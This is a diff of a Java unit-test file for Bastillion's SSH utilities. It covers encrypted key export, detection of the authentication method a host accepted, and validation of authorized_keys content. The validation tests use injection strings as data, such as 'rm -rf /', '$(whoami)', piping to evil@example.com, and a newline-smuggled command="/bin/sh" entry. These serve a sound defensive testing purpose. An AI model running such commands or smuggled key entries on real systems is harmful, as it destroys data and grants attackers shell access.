@@ -8,14 +8,18 @@ package io.bastillion.manage.util;
 import com.jcraft.jsch.JSch;
 import com.jcraft.jsch.JSchException;
 import com.jcraft.jsch.KeyPair;
+import io.bastillion.manage.model.HostSystem;
 import io.bastillion.manage.model.SchSession;
 import io.bastillion.manage.model.UserSchSessions;
 import org.junit.jupiter.api.Test;
 
 import java.io.ByteArrayOutputStream;
+import java.security.GeneralSecurityException;
 import java.security.KeyPairGenerator;
+import java.util.ArrayList;
 import java.util.Base64;
 import java.util.HashSet;
+import java.util.List;
 import java.util.Set;
 import java.util.concurrent.CountDownLatch;
 import java.util.concurrent.ExecutorService;
@@ -27,8 +31,10 @@ import static org.junit.jupiter.api.Assertions.assertEquals;
 import static org.junit.jupiter.api.Assertions.assertFalse;
 import static org.junit.jupiter.api.Assertions.assertNotEquals;
 import static org.junit.jupiter.api.Assertions.assertNotNull;
+import static org.junit.jupiter.api.Assertions.assertNull;
 import static org.junit.jupiter.api.Assertions.assertThrows;
 import static org.junit.jupiter.api.Assertions.assertTrue;
+import static org.junit.jupiter.api.Assumptions.assumeTrue;
 
 /**
  * Covers the pure key-encoding/validation logic behind Bastillion's two key-generation
@@ -81,6 +87,81 @@ class SSHUtilTest {
 
         assertDoesNotThrow(() -> SSHUtil.validateKeyPair(privatePem, publicKey, ""));
         assertEquals("ED25519", SSHUtil.getKeyType(publicKey));
+    }
+
+    // --- rewrapWithOpenSSHKeygen: the passphrase the user chose must actually be applied ---
+    // This runs where a user generates a key to download, and the result is presented as
+    // protected by their passphrase. A silent failure here used to return the key completely
+    // unencrypted, which is indistinguishable from success to every caller.
+
+    @Test
+    void isEncryptedOpenSSHPrivateKeyRejectsAFreshlyBuiltUnencryptedKey() throws Exception {
+        KeyPairGenerator kpg = KeyPairGenerator.getInstance("Ed25519");
+        java.security.KeyPair kp = kpg.generateKeyPair();
+
+        // buildOpenSSHPrivateKey writes "none" as the openssh-key-v1 cipher name.
+        assertFalse(SSHUtil.isEncryptedOpenSSHPrivateKey(SSHUtil.buildOpenSSHPrivateKey(kp, KeyPair.ED25519)));
+    }
+
+    @Test
+    void isEncryptedOpenSSHPrivateKeyRejectsAnythingItCannotParse() {
+        assertFalse(SSHUtil.isEncryptedOpenSSHPrivateKey(null));
+        assertFalse(SSHUtil.isEncryptedOpenSSHPrivateKey(""));
+        assertFalse(SSHUtil.isEncryptedOpenSSHPrivateKey("not a pem at all"));
+        // right envelope, unreadable contents - cannot prove encryption, so not encrypted
+        assertFalse(SSHUtil.isEncryptedOpenSSHPrivateKey(
+                "-----BEGIN OPENSSH PRIVATE KEY-----\n####\n-----END OPENSSH PRIVATE KEY-----\n"));
+        // valid base64, but not an openssh-key-v1 container
+        assertFalse(SSHUtil.isEncryptedOpenSSHPrivateKey(
+                "-----BEGIN OPENSSH PRIVATE KEY-----\n"
+                        + Base64.getEncoder().encodeToString("some other key format".getBytes())
+                        + "\n-----END OPENSSH PRIVATE KEY-----\n"));
+    }
+
+    @Test
+    void rewrapWithOpenSSHKeygenActuallyEncryptsTheKey() throws Exception {
+        assumeTrue(sshKeygenAvailable(), "ssh-keygen not on PATH");
+
+        KeyPairGenerator kpg = KeyPairGenerator.getInstance("Ed25519");
+        java.security.KeyPair kp = kpg.generateKeyPair();
+        String plain = SSHUtil.buildOpenSSHPrivateKey(kp, KeyPair.ED25519);
+
+        String rewrapped = SSHUtil.rewrapWithOpenSSHKeygen("7", plain, "correct horse battery staple");
+
+        assertTrue(SSHUtil.isEncryptedOpenSSHPrivateKey(rewrapped));
+        KeyPair loaded = KeyPair.load(new JSch(), rewrapped.getBytes(), null);
+        assertTrue(loaded.isEncrypted());
+        assertTrue(loaded.decrypt("correct horse battery staple"));
+        loaded.dispose();
+    }
+
+    @Test
+    void rewrapWithOpenSSHKeygenThrowsRatherThanReturningAnUnencryptedKey() throws Exception {
+        assumeTrue(sshKeygenAvailable(), "ssh-keygen not on PATH");
+
+        // Content ssh-keygen cannot load as a private key, so it exits non-zero having left
+        // the file exactly as it found it. This is precisely the shape of the old bug: the
+        // method returned that untouched file, so the caller received back the very bytes it
+        // passed in and had no way to tell they were not encrypted.
+        String notAKey = "-----BEGIN OPENSSH PRIVATE KEY-----\nnonsense\n-----END OPENSSH PRIVATE KEY-----\n";
+
+        GeneralSecurityException ex = assertThrows(GeneralSecurityException.class,
+                () -> SSHUtil.rewrapWithOpenSSHKeygen("7", notAKey, "correct horse battery staple"));
+
+        assertTrue(ex.getMessage().contains("ssh-keygen"), ex.getMessage());
+    }
+
+    private static boolean sshKeygenAvailable() {
+        try {
+            Process proc = new ProcessBuilder("ssh-keygen", "-?")
+                    .redirectErrorStream(true).start();
+            proc.getOutputStream().close();
+            proc.getInputStream().readAllBytes();
+            proc.waitFor();
+            return true;
+        } catch (Exception ex) {
+            return false;
+        }
     }
 
     @Test
@@ -163,11 +244,126 @@ class SSHUtilTest {
         return pubOut.toString();
     }
 
-    // --- isSafeAuthorizedKeysPath / isSafeKeyContent: guards against shell command
-    // injection in addPubKey, where these values are interpolated into "cat"/"echo"/"chmod"
-    // commands sent over the exec channel (see GitHub advisory - authorized_keys path and
+    // --- AcceptedAuthMethodLogger / authMethodFor: the systems screen's Auth column has to
+    // say what the host accepted, not what Bastillion offered. JSch exposes no accessor for
+    // it, so the method is read back out of its own log line ---
+
+    @Test
+    void acceptedAuthMethodLoggerReadsTheMethodOutOfJschsSuccessLine() {
+        SSHUtil.AcceptedAuthMethodLogger logger = new SSHUtil.AcceptedAuthMethodLogger(null);
+        logger.log(com.jcraft.jsch.Logger.INFO, "Authentication succeeded (publickey).");
+        assertEquals("publickey", logger.acceptedMethod());
+    }
+
+    @Test
+    void acceptedAuthMethodLoggerReadsTheSigningAlgorithmOutOfJschsDebugLine() {
+        SSHUtil.AcceptedAuthMethodLogger logger = new SSHUtil.AcceptedAuthMethodLogger(null);
+        logger.log(com.jcraft.jsch.Logger.DEBUG, "ssh-ed25519-cert-v01@openssh.com auth success");
+        assertEquals("ssh-ed25519-cert-v01@openssh.com", logger.acceptedAlgorithm());
+    }
+
+    @Test
+    void acceptedAuthMethodLoggerKeepsTheLastMethodWhenEarlierOnesFailed() {
+        SSHUtil.AcceptedAuthMethodLogger logger = new SSHUtil.AcceptedAuthMethodLogger(null);
+        logger.log(com.jcraft.jsch.Logger.INFO, "Next authentication method: keyboard-interactive");
+        logger.log(com.jcraft.jsch.Logger.INFO, "Authentication succeeded (password).");
+        assertEquals("password", logger.acceptedMethod());
+    }
+
+    @Test
+    void acceptedAuthMethodLoggerReportsNothingWhenNoMethodEverSucceeded() {
+        SSHUtil.AcceptedAuthMethodLogger logger = new SSHUtil.AcceptedAuthMethodLogger(null);
+        logger.log(com.jcraft.jsch.Logger.INFO, "Disconnecting from localhost port 22");
+        assertNull(logger.acceptedMethod());
+        assertNull(logger.acceptedAlgorithm());
+    }
+
+    @Test
+    void acceptedAuthMethodLoggerEnablesInfoAndDebugSoJschBuildsTheMessagesAtAll() {
+        // JSch guards both lines with isEnabled() - reporting either level as disabled would
+        // mean the line is never constructed and what the host accepted never seen.
+        SSHUtil.AcceptedAuthMethodLogger logger = new SSHUtil.AcceptedAuthMethodLogger(null);
+        assertTrue(logger.isEnabled(com.jcraft.jsch.Logger.INFO));
+        assertTrue(logger.isEnabled(com.jcraft.jsch.Logger.DEBUG));
+    }
+
+    @Test
+    void acceptedAuthMethodLoggerPassesEverythingOnToTheLoggerItReplaced() {
+        List<String> delegated = new ArrayList<>();
+        com.jcraft.jsch.Logger delegate = new com.jcraft.jsch.Logger() {
+            public boolean isEnabled(int level) { return true; }
+            public void log(int level, String message) { delegated.add(message); }
+        };
+        SSHUtil.AcceptedAuthMethodLogger logger = new SSHUtil.AcceptedAuthMethodLogger(delegate);
+        logger.log(com.jcraft.jsch.Logger.INFO, "Authentication succeeded (publickey).");
+        logger.log(com.jcraft.jsch.Logger.WARN, "something else");
+        assertEquals(List.of("Authentication succeeded (publickey).", "something else"), delegated);
+    }
+
+    @Test
+    void authMethodForTellsCertificateFromKeyByTheAlgorithmThatSignedIt() {
+        // Both are offered as publickey identities, so the method name cannot distinguish
+        // them - which one the host took is the algorithm it accepted a signature from.
+        assertEquals(HostSystem.AUTH_METHOD_CERTIFICATE,
+                SSHUtil.authMethodFor(null, "publickey", "ssh-ed25519-cert-v01@openssh.com"));
+        assertEquals(HostSystem.AUTH_METHOD_KEY,
+                SSHUtil.authMethodFor(null, "publickey", "ssh-ed25519"));
+        assertEquals(HostSystem.AUTH_METHOD_CERTIFICATE,
+                SSHUtil.authMethodFor(null, "publickey", "rsa-sha2-512-cert-v01@openssh.com"));
+        assertEquals(HostSystem.AUTH_METHOD_KEY,
+                SSHUtil.authMethodFor(null, "publickey", "rsa-sha2-512"));
+    }
+
+    @Test
+    void authMethodForFallsBackToTheOnlyCredentialOfferedWhenNoAlgorithmWasReported() {
+        assertEquals(HostSystem.AUTH_METHOD_KEY,
+                SSHUtil.authMethodFor(HostSystem.AUTH_METHOD_KEY, "publickey", null));
+    }
+
+    @Test
+    void authMethodForLeavesPublickeyUnknownWhenBothWereOfferedAndNothingSaysWhich() {
+        assertNull(SSHUtil.authMethodFor(null, "publickey", null));
+    }
+
+    @Test
+    void authMethodForDoesNotCreditTheCertificateWhenTheHostTookAPasswordInstead() {
+        assertEquals(HostSystem.AUTH_METHOD_PASSWORD,
+                SSHUtil.authMethodFor(null, "password", null));
+        assertEquals(HostSystem.AUTH_METHOD_PASSWORD,
+                SSHUtil.authMethodFor(null, "keyboard-interactive", null));
+    }
+
+    @Test
+    void authMethodForLeavesAnUnrecognizedOrMissingMethodUnknown() {
+        assertNull(SSHUtil.authMethodFor(HostSystem.AUTH_METHOD_KEY, null, null));
+        assertNull(SSHUtil.authMethodFor(null, "gssapi-with-mic", null));
+        assertNull(SSHUtil.authMethodFor(null, "none", null));
+    }
+
+    // --- appendKeyLine: keyManagement=append shares authorized_keys with whatever else
+    // manages it, so the file it leaves behind has to be safe to append to ---
+
+    @Test
+    void appendKeyLineTerminatesTheFileSoTheNextAppendStartsItsOwnLine() {
+        assertEquals("existing-key\nnew-key\n", SSHUtil.appendKeyLine("existing-key\n", "new-key"));
+    }
+
+    @Test
+    void appendKeyLineSeparatesFromAnExistingFileThatHasNoFinalNewline() {
+        assertEquals("existing-key\nnew-key\n", SSHUtil.appendKeyLine("existing-key", "new-key"));
+    }
+
+    @Test
+    void appendKeyLineAddsNoBlankFirstLineWhenThereIsNoFileYet() {
+        assertEquals("new-key\n", SSHUtil.appendKeyLine("", "new-key"));
+    }
+
+    // --- isSafeAuthorizedKeysPath / isSafeKeyContent: originally guards against shell
+    // command injection in addPubKey, which interpolated these values into "cat"/"echo"/
+    // "chmod" commands on an exec channel (see GitHub advisory - the authorized_keys path and
     // public key content are both attacker-reachable, one via the system form, one via a
-    // pasted/uploaded public key comment) ---
+    // pasted/uploaded public key comment). addPubKey now uses SFTP, so no shell parses
+    // either one; they are kept, and still tested, as input validation ---
 
     @Test
     void isSafeAuthorizedKeysPathAcceptsOrdinaryPaths() {
@@ -198,19 +394,29 @@ class SSHUtilTest {
     }
 
     @Test
-    void isSafeKeyContentRejectsKeyWithInjectedSingleQuoteBreakingEchoQuoting() {
-        // breaks out of the single-quoted echo '...' command built in addPubKey
-        assertFalse(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... '; rm -rf / #"));
+    void isSafeKeyContentAcceptsAnApostropheInAKeyComment() {
+        // Ordinary in a comment, and harmless now that authorized_keys is written over SFTP
+        // rather than through echo '...'. Rejecting it dropped the key from the file and told
+        // the user nothing.
+        assertTrue(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... alice's laptop"));
     }
 
     @Test
-    void isSafeKeyContentRejectsOtherShellMetacharacters() {
-        assertFalse(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... $(whoami)"));
-        assertFalse(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... `whoami`"));
-        assertFalse(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... test; rm -rf /"));
-        assertFalse(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... test | mail evil@example.com"));
-        assertFalse(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... test && rm -rf /"));
-        assertFalse(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... test\"quoted\""));
+    void isSafeKeyContentRejectsLineBreaksThatWouldAppendASecondEntry() {
+        // The real risk: a key comment that splits the line gets its own authorized_keys
+        // entry, with its own options.
+        assertFalse(SSHUtil.isSafeKeyContent(
+                "ssh-ed25519 AAAA... x\ncommand=\"/bin/sh\" ssh-ed25519 AAAA... attacker"));
+        assertFalse(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... x\r\nssh-ed25519 BBBB... attacker"));
+    }
+
+    @Test
+    void isSafeKeyContentAcceptsShellMetacharactersBecauseNoShellSeesThem() {
+        // addPubKey reads and writes authorized_keys over SFTP, so none of these can do
+        // anything. Keeping them out only cost users their access, silently.
+        assertTrue(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... $(whoami)"));
+        assertTrue(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... test; rm -rf /"));
+        assertTrue(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... test\"quoted\""));
     }
 
     @Test
